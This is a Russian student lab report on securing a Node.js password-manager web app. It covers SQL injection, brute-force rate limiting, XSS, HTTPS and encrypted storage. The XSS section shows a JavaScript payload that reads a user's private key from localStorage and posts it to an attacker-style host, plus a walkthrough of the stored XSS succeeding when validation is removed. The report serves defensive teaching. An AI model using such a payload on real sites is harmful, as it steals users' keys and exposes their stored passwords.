# Лабороторная работа №4
## Ссылки
Клиентская часть приложения доступна по ссылке
* https://saveleva.ml/

## Аннотация

* [Постановка задачи](#Постановка-задачи)
* [Описание приложения](#Описание-приложения)
*   - [Используемые технологии](#Используемые-технологии)
        - [Клиент](#Клиент)
            - [Дополнительные библоитеки css](#Дополнительные-библоитеки-css)
            - [Дополнительные библиотеки javascript](#Дополнительные-библиотеки-javascript)
        - [Сервер (бэкенд)](#Сервер)
            - [Дополнительные библиотеки javascript (nodejs)](#Дополнительные-библиотеки-javascript)
    - [Схема работы](#Схема-работы)
    
* [Анализ безопаности](#Анализ-безопаности)
     - [SQL инъекции](#SQL-инъекции)
     - [Перебор пароля](#Перебор-пароля)
     - [XSS](#XSS)
     - [Перехват трафика между клиентом и сервером](#Перехват-трафика-между-клиентом-и-сервером)
     - [Утечка базы данных](#Утечка-базы-данных)

Серверная часть распологается на сервере saveleva.ml.

## Постановка задачи
* Задача: "Создать защищенное веб-приложение"

> Да, да. Я серьезно, это всё задание, никаких других пояснений к нему не давали... 

* Цель: неизвестно
> очевидно из задачи, трудно придумать какая тут может быть цель =). Вот такая у нас замечательная система образования

> P.S. вряд-ли препод будет копаться в коммитах проекта... 

Так как никаких подробностей по заданию нет, я взяла на себя смелость, примерно самой прикинуть, что требуется сделать. Как я поняла, нужно сделать какое-то веб-приложение и проанализировать его защищенность.


## Описание приложения
Простое веб-приложение для хранения паролей от различных сервисов.

Так как я плохо знаю **javascript**, решила, в целях обучения реализовать проект полностью на нем (клиент и сервер).

### Используемые технологии
#### Клиент

* html
* css
* javascript

##### Дополнительные библоитеки css
* [css фреймворк bootstrap](https://getbootstrap.com/)

##### Дополнительные библиотеки javascript
* [jquery](https://jquery.com/) использовала для удобного доступа к элементам DOM и Ajax запросов
* [lodash](https://lodash.com/) использовала функции **_.is*** и механизм шаблонов
* [crypto-js](https://github.com/brix/crypto-js) использовала для AES шифрования
* [forge](https://github.com/digitalbazaar/forge) использовала алгоритмы асинхронного RSA шифрования

#### Сервер

* **javascript** (nodejs) на веб-фреймворке [expressjs](https://expressjs.com/)
* **nginx** - веб-сервер
* **mysql** - база данных
* **docker** - приложение развертывается внутри контейнеров **docker**

##### Дополнительные библиотеки javascript

* [mysql](https://www.npmjs.com/package/nodejs-mysql) для работы с базой данных
* [express-session](https://www.npmjs.com/package/express-session) сессии в **expressjs**
* [express-mysql-session](https://www.npmjs.com/package/express-mysql-session) сохранение сессий **expressjs** в базе данных
* [xss](https://www.npmjs.com/package/xss) - для фильтра  xss атак
* [helmet](https://www.npmjs.com/package/helmet) - установила по совету [лучших практик безопасности expressjs](https://expressjs.com/en/advanced/best-practice-security.html)
* [underscore](https://www.npmjs.com/package/underscore) библоитека с полезными и удобыми методами
* [crypto-js](https://github.com/brix/crypto-js) использовала для AES шифрования
* [node-forge](https://github.com/digitalbazaar/forge) использовала алгоритмы асинхронного RSA шифрования

### Схема работы
Это SPA(single page application) приложение. То есть загружается клиентская часть, и полностью управляет страницей без перегрузок. Для получаения данных от сервера, приложение отправляет **AJAX** запросы. Сервер в свою очередь предоставляет **API** для извлечения и изминения данных.


## Анализ безопаности
### SQL инъекции

Все запросы к базе данных выполняются через подготовленные запросы (сейчас до сих пор кто-то делает по другому, и их не бьют палками?). А данные подставляются в них через плейсхолдеры. Поэтому SQL инъекции невозможны в этом приложении. В качестве примера давайте рассмотрим авторизацию в приложении.
Проверку того, что пользователь есть в базе, и пароль его совпдадает с введенным, осуществляет функция **checkUser** ([из модуля api.js](modules/api.js)):
```javascript
function checkUser(userId, password, callback) {
	db.query('SELECT hash FROM users WHERE user_id = ?', [userId], (result) => {
		if(hash.hashNotEmpty(result)) {
			return callback(hash.checkPassword(password,result[0].hash));
		} else {
			callback(false);
		}
	});
}
```
В переменные `userId` и `password` попадают данные из формы авторизации:
![sql_inject1](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/sql_inject1.jpg)

То есть предположительно должен выполниться указанный запрос, и он бы сработал как указано на следующем скрине:
![sql_inject2](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/sql_inject2.jpg)

То есть нам удалось успешно выполнить не предусмотренный SQL запрос.

Теперь посмотрим, что происходит на самом деле:
![sql_inject3](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/sql_inject3.jpg)

Как видно из журнала базы данных, все что было в поле **username** попало в плейсхолдер и окаозалось просто пареметром с которым сравнивается колонка **user_id**, все ковычки экранированы как и положено. И данный запрос конечно ничего не вернет:
![sql_inject4](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/sql_inject4.jpg)

**Вывод**: используете подготовленные выражения, не формируйте **SQL** запросы из входных данных. За это бьют палками!

### Перебор пароля
Злоумышленник может попробовать перебрать пароль к приложению, например посмотрев каким образом происходит авторизация:

![brute1](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/brute1.jpg)
![brute2](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/brute2.jpg)

И может написать скрип для перебора пароля к сервису. Но тут он столкнется с ограничением количества попыток авторизации:
![brute3](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/brute3.jpg)

Как видно из скрина, после нескольких попыток авторизации, веб-сервер возвращает **503** ошибку. Реализовано это на уровне веб-сервера **nginx**. С помощью опций **limit_req_zone** и **limit_req** (подробнее можно узнать из [документации](http://nginx.org/en/docs/http/ngx_http_limit_req_module.html)) в [конфигурации nginx](docker/nginx/default.conf):
```nginx
limit_req_zone $binary_remote_addr zone=auth_limit:1m rate=5r/m;
...
server {
...
...
...
    location /auth
    {
         limit_req zone=auth_limit burst=3 nodelay;
         try_files $uri $uri/ @backend;
    }
...
}    
```

### XSS
Если у зломышленника получится перехватить сессию и авторизоваться в веб-приложении под пользователем. Он все равно не получит секретных данных пользователя:

![xss1](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/xss1.jpg)

На скрине видно, как злоумышленник использовал перехваченные cookie, для того чтобы получить все сохраненные в приложении пароли пользователя. Но поле пароля зашифрованно приватным RSA ключом, которого нет у злоумышленника. Но он может знать, что даннный ключ хранится в **localStorage** в браузере пользователя. И попытается добыть эти данные, эксплуатируя XSS уязвимость.

Например он может попытаться добавить **javascript** код на страницу, который отправляет ему ключ пользователя:
```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://evil.saveleva.ml", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send(localStorage.getItem("key"));
```

Если этот скрипт выполнится на странице пользователя, то он отправит приватный RSA ключ злоумышленнику, по адресу http://evil.saveleva.ml. А затем, с помощью него, он сможет расшифровать данные.

Он может попытаться создать новый сервис, и в поле логина вставить этот скрипт. Опять же, используя перехваченную сессию

![xss2](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/xss2.jpg)

За добавление сервиса отвечает функция **addService** [из модуля api.js](modules/api.js)
```javascript
function addService(userId, service, login, password, newService, newLogin, callback) {
	getPublicKey(userId, (publicKeyPem) => {
		let publicKey = forge.pki.publicKeyFromPem(publicKeyPem);
		if(validate.checkEmptyAndXss([service, login, password, newService, newLogin])) {
			password = forge.util.encode64(publicKey.encrypt(password));
			db.query(
				'INSERT INTO passwords VALUES(?, ?, ?, ?) ON DUPLICATE KEY UPDATE password = ?, service = ?, login = ?',
				[userId, service, login, password, password, newService, newLogin],
				(res, err) =>
				{
					if(err) {
						callback(false);
					} else {
						callback(true);
					}
				});
		} else {
			console.error('service or login or password is empty');
			callback(false);
		}
	});
}
```

Если убрать проверку **validate.checkEmptyAndXss** злоумышленник сможет внедрить сторонний **javascript** код на страницу. Предположем что данной проверки нет, тогда выше указанный http запрос выполнится успешно и в базу запишется вместо логина вредоносный **javascript** код.

Убираем проверки, убеждаемся что вредоноснвый код успешно записан в базу:
![xss5](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/xss5.jpg)

Когда пользователь зайдет на страницу приложения, его ключ отправится злоумышленнику:

![xss3](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/xss3.jpg)
![xss4](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/xss4.jpg)

А теперь вернем проверку данных на XSS и убедимся, что злоумышленник не сможет такое провернуть снова:
![xss6](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/xss6.jpg)

Вот теперь все отлично! Сервер вернул ошибку "Wrong data".

### Перехват трафика между клиентом и сервером
Злоумышленник также может попытаться перехватить трафик между клиентом и сервером. Если ему удасться словить момент авторизации пользователя, тогда он сможет узнать его пароль.

Да действительно, при перехвате трафика злоумышленник может увидеть пароль, который был отправлен при авторизации.

![dump1](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/dump1.jpg)

Для защиты от такого рода атаки, нужно использовать **https** протолкол для работы с приложением. Конечно же наше приложение умеет работать по **https**.

Делаем тоже самое, авторизуемся в приложении, но только уже по **https** протоколу:

![dump2](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/dump2.jpg)

Теперь злоумышленник ничего полезного из перехваченного трафика получить не может:

![dump3](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/dump3.jpg)

Приложения в публичном доступе, работают только по **https** протоколу: https://saveleva.ml/.


### Утечка базы данных
Если злоумышленнику удалось заполучить доступ к базе данных. То секретную информацию он все равно извлечь не сможет.

В базе есть три таблицы **user**, **rsa_keys**, **passwords**.

В таблице **users** хранятся имя пользователя и **SHA256** хэш от соли и пароля.
![db1](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/db1.jpg)

По ним пароль пользователя узнать невозможно (только методом перебора).


В таблице **rsa_keys** хранятся приватный и публичный RSA ключи пользователя. Приватный ключ зашифрован по алгоритму **AES** паролем пользователя. Приватный ключ используется для расшифровки паролей, публичный для зашифровки. Публичный ключ скрывать не нужно, поэтому он хранится в открытом виде.

![db2](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/db2.jpg)

В таблице **passwords хранятся все данные о сервисах добавленных пользователем. Пароли в нем зашиврованны публичным ключем из предыдущей таблицы. Расшифровать их можно, только зная приватный ключ, но он в свою очередь зашфифрован паролем пользователя.

![db3](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/db3.jpg)

Таким образом, единственный способ расшифровать данные в базе - это узнать пароль пользователя. Итого, если произойдет утечка базы данных, злоумышленник из нее несможет извлечь секретные данные, не зная пароля пользователя.